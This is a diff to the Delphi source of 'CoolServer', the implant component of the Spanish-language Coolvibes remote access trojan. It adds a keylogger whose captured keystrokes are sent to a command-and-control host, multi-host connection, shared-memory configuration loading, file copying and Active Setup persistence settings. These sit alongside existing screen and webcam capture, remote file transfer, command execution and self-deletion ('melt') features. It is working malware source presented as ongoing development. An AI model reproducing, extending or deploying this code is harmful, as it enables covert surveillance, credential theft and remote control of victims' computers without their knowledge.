@@ -12,8 +12,8 @@
 
      El equipo Coolvibes
 *)
-library CoolServer;
-
+//library CoolServer;
+program coolserver;
 uses
   Windows,
   SysUtils,
@@ -34,15 +34,15 @@ uses
   MiniReg,
   UnitVariables,
   unitCapScreen,  //Se activa de nuevo
-  unitCamScreen, //Aca estan todas las funciones de captura  //Desactivado jpeg plugin en V0.5UP2
+  unitCamScreen, //Webcam
   unitAvs,
   UnitCambioId,
   SettingsDef,
-  //  UnitWebcam,
   UnitInstalacion,
   UnitShell,
   UnitServicios,
   SocketUnit,
+  UnitKeylogger,
   UnitTransfer;
 
 type
@@ -63,16 +63,16 @@ type
    }
 var
   //Cliente: TClassClientSocket;
-  Msg:  TMsg;
-  SH:   integer;  //SocketHandle de la conexión principal
-  Descarga: TDescarga;
-  RecibiendoFichero: boolean = False;
-  sock: TClientSocket;
-  KeepAliveHandle: THandle;
-  pingSent, Busy, pongReceived: boolean;
-  lastCommandTime: integer;
-
-
+  SH                  : integer;  //SocketHandle de la conexión principal
+  RecibiendoFichero   : boolean = False;
+  sock                : TClientSocket;
+  KeepAliveHandle     : THandle;
+  pingSent            : boolean;
+  Busy                : boolean;
+  pongReceived        : boolean;
+  lastCommandTime     : integer;
+  MCompartida         : THandle;
+  Indice              : string;
 const
   WM_ACTIVATE = $0006;
   WM_QUIT = $0012;
@@ -85,76 +85,41 @@ const
 
   procedure CrearServer();
   var
-    ConfigLeida: PSettings;
-    i: integer;
-    ConfigRegistro : string;
+    ConfigCompartida: PConfigCompartida;
   begin
     //Aquí va la carga de opciones del editor. Inicializamos las variables configurables del troyano
     //que están todas dentro de un record (Configuracion : TSettings).
 
-      //0.53 hay que cargar la configuración del registro
-    RegGetString(HKEY_CURRENT_USER, 'Software\C00l', ConfigRegistro); //leemos la config escrita por el conectador
-    RegDelValue(HKEY_CURRENT_USER, 'Software\C00l'); //la borramos para que no sea tan facil de sacarla :p
-    VersionDelServer      := '0.53';
+      //0.53 hay que cargar la configuración de memoria
+    VersionDelServer := '0.54';
+    MCompartida:=OpenFileMapping(FILE_MAP_READ,False,'Config');
 
-    if(Configregistro <> '') then
+
+    if(MCompartida <> 0) then //Leida con Éxito :D
     begin
-
-      Configuracion.sHost   := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1);
-      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
-
-      Configuracion.sPort   := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1);
-      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
-
-      Configuracion.sID     := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1);
-      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
-
-      Configuracion.iPort   := strtointdef(Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1),80);
-      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
-
-      if(Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1) = 'false') then
-        Configuracion.bCopiarArchivo := False
-      else
-        Configuracion.bCopiarArchivo := True;
-      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
-
-      Configuracion.sFileNameToCopy := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1);
-      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
-
-      Configuracion.sCopyTo := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1); //la carpeta donde debe copiarse
-      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
-
-      if(Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1) = 'false') then
-        Configuracion.bCopiarConFechaAnterior := False
-      else
-        Configuracion.bCopiarConFechaAnterior := True;
-      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
-
-      if(Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1) = 'false') then
-        Configuracion.bMelt   := False
-      else
-        Configuracion.bMelt   := True;
-      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
-
-      if(Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1) = 'false') then
-        Configuracion.bArranqueRun := False
-      else
-        Configuracion.bArranqueRun := True;
-      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
-
-      Configuracion.sRunRegKeyName := Copy(ConfigRegistro, 1, Pos('|', Configregistro) - 1);
-      Delete(Configregistro, 1, Pos('|', ConfigRegistro));
-      //Nombre con el que me agrego a policies
-      //MessageBox(0, PChar('Leí la configuración bien. El puerto es: '+Configuracion.sPort), 'Leí', 0); //Para pruebas!!!
-
+      ConfigCompartida:=MapViewOfFile(Mcompartida,FILE_MAP_READ,0,0,0);
+           //quizás habría que guardar esta configuración cifrada...
+      Configuracion.sHosts                    :=   ConfigCompartida.sHosts;
+      Configuracion.sID                      :=   ConfigCompartida.sID;
+      Configuracion.bCopiarArchivo           :=   ConfigCompartida.bCopiarArchivo;
+      Configuracion.sFileNameToCopy          :=   ConfigCompartida.sFileNameToCopy;
+      Configuracion.sCopyTo                  :=   ConfigCompartida.sCopyTo;
+      Configuracion.bCopiarConFechaAnterior  :=   ConfigCompartida.bCopiarConFechaAnterior;
+      Configuracion.bMelt                    :=   ConfigCompartida.bMelt;
+      Configuracion.bArranqueRun             :=   ConfigCompartida.bArranqueRun;
+      Configuracion.sRunRegKeyName           :=   ConfigCompartida.sRunRegKeyName;
+      Configuracion.sActiveSetupKeyName      :=   ConfigCompartida.sActiveSetupKeyName;
+      Configuracion.bArranqueActiveSetup     :=   ConfigCompartida.bArranqueActiveSetup;
+      Configuracion.sPluginName              :=   ConfigCompartida.sPluginName;
+      Configuracion.sInyectadorFile          :=   ConfigCompartida.sInyectadorFile;
+      UnmapViewOfFile(ConfigCompartida);
+      CloseHandle(MCompartida);
     end
     else
     begin    //Para debug
-      ExitProcess(0);
-      Configuracion.sHost   := '127.0.0.1';
-      Configuracion.sPort   := '7000';
+      //ExitProcess(0);
+      Configuracion.sHosts   := '127.0.0.1:80¬';
       Configuracion.sID     := 'Coolserver';
-      Configuracion.iPort   := 7000;
       Configuracion.bCopiarArchivo := False; //Me copio o no?
       Configuracion.sFileNameToCopy := 'coolserver.exe';
       Configuracion.sCopyTo := 'C:\';
@@ -162,7 +127,11 @@ const
       Configuracion.bMelt   := False;
       Configuracion.bArranqueRun := False;
       Configuracion.sRunRegKeyName := 'Coolserver';
+      Configuracion.bArranqueActiveSetup := False;
+      Configuracion.sActiveSetupKeyName := '{blah-blah-blah-blah'; 
     end;
+
+    
   end;
 
   procedure CheckAlive();
@@ -173,7 +142,7 @@ const
       Exit;
     end;
 
-    if (getTickCount - lastCommandTime) < 20000 then
+    if ((getTickCount() - lastCommandTime) < 20000) then
       Exit;
     //No ha pasado 20 seg idle asi que no mando ping: (getTickCount - lastCommandTime)
 
@@ -221,10 +190,6 @@ const
     begin
       TranslateMessage(Msg);
       DispatchMessage(Msg);
-      if RegKeyExists(HKEY_CURRENT_USER,
-        'Software\Microsoft\Active Setup\Installed Components\{D3B930A4-76AC-11DD-82E7-913F56D89593}\') then
-        RegDelKey(HKEY_CURRENT_USER,
-          'Software\Microsoft\Active Setup\Installed Components\{D3B930A4-76AC-11DD-82E7-913F56D89593}\');
     end;
   end;
 
@@ -291,23 +256,28 @@ end;
 
   procedure iniciar();
   var
-    Recibido, Respuesta, TempStr, TempStr1, TempStr2, TempStr3: ansistring;
+    Recibido, Respuesta, TempStr, TempStr1, TempStr2, TempStr3, TempStr4: ansistring;
     Tipo, BotonPulsado, i: integer;
     TempCardinal: cardinal;
     Tam: int64;
     ShellParameters: TShellParameters;
     ThreadInfo: TThreadInfo;
     FilePath, LocalFilePath: ansistring;
-    //  Socket: TCustomWinSocket;
-    //  socket: TCLientSocket;
+    Host  :string;
+    Port : integer;
     CSocket : TClientSocket; //Socket para la captura de pantalla
   begin
     try
       begin
         sock := TCLientSocket.Create;  //Socket principal
-        CSocket := TClientSocket.Create; //Socket Captura de Pantalla   
-
-        sock.Connect(Configuracion.sHost, Configuracion.iPort);
+        CSocket := TClientSocket.Create; //Socket Captura de Pantalla, captura de webcam y thumbnails   
+             if indice = '' then
+        indice := configuracion.shosts;
+        host := Copy(indice, 1, Pos(':', indice) -1 );
+        Delete(indice, 1, Pos(':', indice));
+        Port := strtointdef(Copy(indice, 1, Pos('¬', indice) -1 ),80);
+        Delete(indice, 1, Pos('¬', indice));
+        sock.Connect(host, port);
         lastCommandTime := getTickCount;
         while sock.Connected do
         begin
@@ -317,7 +287,11 @@ end;
 
           if Recibido = 'PING' then  //Respuesta a pings
           begin
-            SendText('PONG' + ENTER);
+           Respuesta :=  
+              Sock.LocalAddress + '|' +LeerID() + '|' + GetCPU() + '|' +
+              GetOS() + '|' + VersionDelServer + '|L|'+GetActiveWindowCaption()+'|'+
+               GetIdleTime()+ '|'+GetUptime()+'|';
+            SendText('PONG|'+Respuesta+ ENTER);
             //    Exit;
           end;
 
@@ -344,7 +318,9 @@ end;
  }
             Respuesta := Sock.LocalAddress + '|' +  //IP privada
               LeerID() + '|' + GetCPU() + '|' +
-              GetOS() + '|' + VersionDelServer + '|';
+              GetOS() + '|' + VersionDelServer + '|1|'+GetActiveWindowCaption()+'|'+
+               GetIdleTime()+ '|'+GetUptime()+'|';
+
             SendText('MAININFO|' + Respuesta + ENTER);
           end;
 
@@ -370,14 +346,14 @@ end;
             begin
               with Configuracion do
                 TempStr := VersionDelServer + '|' + sID +
-                  '|' + sHost + '|' + sPort + '|' +
-                  IntToStr(iTimeToNotify) + ' segundos' + '|' +
+                  '|' + sHosts + '|' +
                   BooleanToStr(bCopiarArchivo, 'Sí', 'No') + '|' +
                   sFileNameToCopy + '|' + sCopyTo +
                   '|' + BooleanToStr(bMelt, 'Sí', 'No') + '|' +
                   BooleanToStr(bCopiarConFechaAnterior, 'Sí', 'No') +
                   '|' + BooleanToStr(bArranqueRun, 'Sí', 'No') +
-                  '|' + sRunRegKeyName + '|' + ParamStr(0) + '|';
+                  '|' + sRunRegKeyName + '|'+ BooleanToStr(bArranqueActiveSetup, 'Sí', 'No') +
+                  '|' + sActiveSetupKeyName + '|' + ParamStr(0) + '|';
               SendText('SERVIDOR|INFO|' + TempStr + ENTER);
             end;
             //Cerrar server
@@ -396,13 +372,12 @@ end;
 
             if TempStr = 'ACTUALIZAR' then
             begin
-              Borrararchivo(extractfilepath(paramstr(0))+'\'+Configuracion.sPluginName);
-               if ShellExecute(0, 'open', PChar(ParamStr(0)), ''{sin parametros},
-                PChar(ExtractFilePath(paramstr(0))), SW_NORMAL) > 32 then
-                ExitProcess(0)
-              else
-                SendText('MSG|Hubo un problema al intentar auto-ejecutarse, la actualización se completara en el siguiente reinicio' + ENTER);
-
+                Borrararchivo(extractfilepath(paramstr(0))+'\'+Configuracion.sPluginName);
+                if ShellExecute(0, 'open', PChar(ParamStr(0)), ''{sin parametros},
+                  PChar(ExtractFilePath(paramstr(0))), SW_NORMAL) > 32 then
+                  ExitProcess(0)
+                else
+                  SendText('MSG|Hubo un problema al intentar auto-ejecutarse, la actualización se completara en el siguiente reinicio' + ENTER);
             end;
           end;
 
@@ -654,8 +629,11 @@ end;
 
           //Comandos relacionados con el FileManager
           if Recibido = 'VERUNIDADES' then
-            SendText('VERUNIDADES|' + GetDrives(Tam) + ENTER);
-
+          begin
+            TempStr := '';
+            TempStr := GetDrives(Tam);
+            SendText('VERUNIDADES|' + TempStr + ENTER);
+          end;
           if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
           begin
             Delete(Recibido, 1, 15);
@@ -663,10 +641,13 @@ end;
             begin
               //Diga que no existe el directorio asignado y salte...
               SendText(GetDirectory(Recibido) + ENTER);
-              Exit;
+              //Exit;
+            end
+            else
+            begin
+              TempStr := GetDirectory(Recibido);
+              SendText('LISTARARCHIVOS|' + IntToStr(Length(TempStr)) + '|' + TempStr + ENTER);
             end;
-            TempStr := GetDirectory(Recibido);
-            SendText('LISTARARCHIVOS|' + IntToStr(Length(TempStr)) + '|' + TempStr + ENTER);
           end;
           //Ejecutar Archivo...
           if Copy(Recibido, 1, 4) = 'EXEC' then
@@ -710,6 +691,7 @@ end;
             end
             else //el archivo no existe.... Se supone que nunca o muy pocas veces debería pasar.
               SendText('MSG|El archivo no existe. Tal vez ya fue borrado.' + ENTER);
+
           end;
 
           //Borrar carpeta
@@ -758,6 +740,19 @@ end;
             else
               SendText('MSG|La carpeta ya existe, no es necesario crearla.' + ENTER);
             //Ya existe una carpeta con ese nombre
+          end;
+
+          //copiar
+          if Copy(Recibido, 1, 5) = 'COPYF' then
+          begin
+            Delete(Recibido, 1, 6);
+            TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //desde
+            Delete(Recibido, 1, Pos('|', Recibido)); 
+            TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //a
+            if copyfile(pchar(TempStr), pchar(TempStr1), false) then
+              SendText('MSG|Archivo copiado con éxito' + ENTER)
+            else
+              SendText('MSG|Error al copiar el archivo' + ENTER);
           end;
           //Fin de comandos relacionados con el FileManager
 
@@ -835,6 +830,12 @@ end;
           end;
           //Fin de comandos relacionados con el Registro
 
+
+          if Copy(Recibido, 1, 14) = 'DATOSCAPSCREEN' then
+          begin
+            SendText('DATOSCAPSCREEN|'+inttostr(anchurapantalla())+'|'+inttostr(alturapantalla())+'|' + ENTER);
+          end;
+          
           //Codigo para capturar la pantalla
           if Copy(Recibido, 1, 9) = 'CAPSCREEN' then
           begin
@@ -842,31 +843,26 @@ end;
 
                  if not (CSocket.Connected) then   //si no estamos conectados conectamos...
                  begin
-                  CSocket.Connect(Configuracion.sHost, Configuracion.iPort);    //conectamos
+                  CSocket.Connect(Host, Port);    //conectamos
                  end;
                   CSocket.SendString('SH|'+inttostr(SH) + ENTER); //nos identificamos
 
                 // while CSocket.Connected do  //
                 if CSocket.Connected then
-                 begin
+                 begin                          //En el futuro se tendria que realizar esta rutina en otro thread aparte para aumentar velocidad
                   Recibido := Trim(Recibido);      //calidad|ancho|alto
                   TempStr1 := Copy(Recibido, 1, Pos('|', Recibido) - 1);//calidad
                   Delete(Recibido, 1, Pos('|', Recibido));
-                  TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //ancho
-                  Delete(Recibido, 1, Pos('|', Recibido));            //recibido = alto
+                  TempStr2 := Copy(Recibido, 1, Pos('|', Recibido) - 1); //alto
+                  Delete(Recibido, 1, Pos('|', Recibido));           
                   MS := TMemoryStream.create;   //MS de la captura de Pantalla
                   MS.Position := 0;
-                  if(Copy(TempStr2, 1, 1) = '%') then//tamaño relativo
-                  begin
-                   Delete(TempStr2, 1, Pos('%', TempStr2));
-                   pantallazo(StrToInt(TempStr1),anchurapantalla()*strtoint(Tempstr2) div 100,alturapantalla()*strtoint(Tempstr2) div 100,GetDesktopWindow());
 
-                  end
-                  else
-                  pantallazo(StrToInt(TempStr1),strtoint(TempStr2),strtoint(Recibido),GetDesktopWindow());
+                  pantallazo(StrToInt(TempStr1),(strtoint(TempStr2) * anchurapantalla )div alturapantalla,strtoint(Tempstr2),GetDesktopWindow());
 
-                  MS.Position := 0;
-                  Csocket.SendString('CAPSCREEN|C|' + IntToStr(MS.size) + ENTER);  //mandamos el tamaño
+
+                  MS.Position := 0;                 //De paso se manda también la anchura y la altura para poder simular clicks
+                  Csocket.SendString('CAPSCREEN|'+inttostr(AnchuraPantalla)+'¬'+inttostr(AlturaPantalla)+'|' + IntToStr(MS.size) + ENTER);  //mandamos el tamaño
                   TempStr := '';
                   SetLength(TempStr, ms.size);
                   Ms.Read(TempStr[1], ms.size);
@@ -881,7 +877,7 @@ end;
           if Copy(recibido, 1, 8) = 'CAMBIOID' then
           begin
             Delete(recibido, 1, 8);
-            CambiarID(recibido);
+            CambiarID(trim(recibido));
           end;
 
           //Comandos relaccionados con la webcam
@@ -896,7 +892,7 @@ end;
 
                  if not (CSocket.Connected) then   //si no estamos conectados conectamos...
                  begin
-                  CSocket.Connect(Configuracion.sHost, Configuracion.iPort);    //conectamos
+                  CSocket.Connect(Host, Port);    //conectamos
                  end;
                   CSocket.SendString('SH|'+inttostr(SH) + ENTER); //nos identificamos
 
@@ -961,7 +957,7 @@ end;
                                                            //calidad
                 if not (CSocket.Connected) then   //si no estamos conectados conectamos...
                  begin
-                  CSocket.Connect(Configuracion.sHost, Configuracion.iPort);    //conectamos
+                  CSocket.Connect(host, port);    //conectamos
                  end;
                   CSocket.SendString('SH|'+inttostr(SH) + ENTER); //nos identificamos
 
@@ -979,8 +975,9 @@ end;
                     CSocket.SendString(Tempstr);    //GOGOGO
                   end
                   else
-                  begin   //Poco probable...
-
+                  begin   //Poco probable pero posible :p
+                    Csocket.SendString('THUMBNAIL|1'+ENTER);
+                    CSocket.SendString('1'); 
                   end;
                   MS.Free;
                   MS := nil;
@@ -1001,7 +998,7 @@ end;
           begin
             Delete(Recibido, 1, 8);
             Recibido   := Trim(Recibido);
-            ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort,
+            ThreadInfo := TThreadInfo.Create(host, port,
               IntToStr(SH), Recibido, 'GETFILE', 0);
             //ThreadedTransfer(Pointer(ThreadInfo)); //para debug
             BeginThread(nil,
@@ -1019,7 +1016,7 @@ end;
             FilePath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
             Delete(Recibido, 1, Pos('|', Recibido));
             Recibido   := Trim(Recibido);
-            ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort,
+            ThreadInfo := TThreadInfo.Create(host, port,
               IntToStr(SH), FilePath, 'RESUMETRANSFER', StrToInt(Recibido));
             BeginThread(nil,
               0,
@@ -1037,7 +1034,7 @@ end;
             Delete(Recibido, 1, Pos('|', Recibido));
             LocalFilePath := Copy(Recibido, 1, Pos('|', Recibido) - 1);
             Delete(Recibido, 1, Pos('|', Recibido));
-            ThreadInfo := TThreadInfo.Create(Configuracion.sHost, Configuracion.iPort,
+            ThreadInfo := TThreadInfo.Create(Host, Port,
               IntToStr(SH), LocalFilePath, 'SENDFILE', 0);
             ThreadInfo.RemoteFileName := FilePath;
             ThreadInfo.UploadSize := StrToInt(Recibido);
@@ -1118,6 +1115,64 @@ end;
             ServicioCrear(TempStr, TempStr1, TempStr2);
             SendText('MSG|Se ha intentado instalar el servicio' + ENTER);
           end;
+
+          // KEYLOGGER!
+          if Recibido = 'ESTADOKEYLOGGER' then
+            SendText('ESTADOKEYLOGGER|'+BooleanToStr(ObtenerEstadoKeylogger, 'ACTIVADO', 'DESACTIVADO')+'|'+GetKeyloggerPath+'|'+ENTER);
+
+          if Pos('ACTIVARKEYLOGGER', Recibido) = 1 then //ACTIVARKEYLOGGER|NOMBRELOG|
+          begin
+            Delete(Recibido, 1, 17);
+            Tempstr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+            EmpezarKeylogger(TempStr);
+            SendText('ESTADOKEYLOGGER|ACTIVADO|'+GetKeyloggerPath+'|'+ENTER);
+          end;
+
+          if Pos('DESACTIVARKEYLOGGER', Recibido) = 1 then
+          begin
+            PararKeylogger();
+            SendText('ESTADOKEYLOGGER|DESACTIVADO|'+GetKeyloggerPath+'|'+ENTER);
+          end;
+
+          if Pos('RECIBIRKEYLOGGER', Recibido) = 1 then
+          begin
+            TempStr := '';
+            TempStr := ObtenerLog();
+            Recibido := '';
+            if not (CSocket.Connected) then
+              CSocket.Connect(Host, Port);
+
+            CSocket.SendString('SH|'+inttostr(SH) + ENTER); //nos identificamos
+
+            if CSocket.Connected then
+            begin
+              Csocket.SendString('KEYLOGGERLOG|'+inttostr(length(Tempstr)+1)+'|'+ ENTER); //enviamos log!
+              Csocket.SendString(TempStr+ENTER);
+            end;
+
+          end;
+
+          if Pos('ELIMINARLOGKEYLOGGER', Recibido) = 1 then //eLiminar el log del keylogger
+          begin
+             SendText('MSG|Log eliminado con éxito' + ENTER);
+             EliminarLog();
+          end;
+
+          if Pos('ONLINEKEYLOGGER', Recibido) = 1 then //Activa o desactiva el online keylogger
+          begin
+            Delete(Recibido, 1, 16);
+            if(Copy(Recibido, 1, Pos('|', Recibido) - 1)='ACTIVAR') then
+            begin
+              SendText('MSG|Online Keylogger activado con éxito' + ENTER);
+              SetOnlineKeylogger(true,sock);
+            end
+            else
+            begin
+              SendText('MSG|Online Keylogger desactivado con éxito' + ENTER);
+              SetOnlineKeylogger(false,nil);
+            end;
+          end;
+
           lastCommandTime := getTickCount;
           Busy := False;
         end;//while sock.connected do
@@ -1130,8 +1185,9 @@ end;
             sock.Disconnect;
           sock.Free;
           //Estamos desconectados así que tenemos que desactivar la webcam y la shell
-          DesactivarWebcams(); //Desactivamos las webcams
+          DesactivarWebcams(); //Desactivamos las webcams para que las pueda usar normalmente
           //La shell se desactiva automaticamente
+          SetOnlineKeylogger(false,nil); //Desactivamos online keylogger
           Exit;
         end;//if sock <> nil
       end//except
@@ -1187,14 +1243,13 @@ begin
   CrearServer();
   //El server solo se instala si en la configuracion se indica
   //  Instalar();
-
   BeginThread(nil,
     0,
     Addr(KeepAliveThread),
     nil,
     0,
     id1);
-
+  OnServerInitKeylogger();
   while True do
   begin
     //  Conectar();
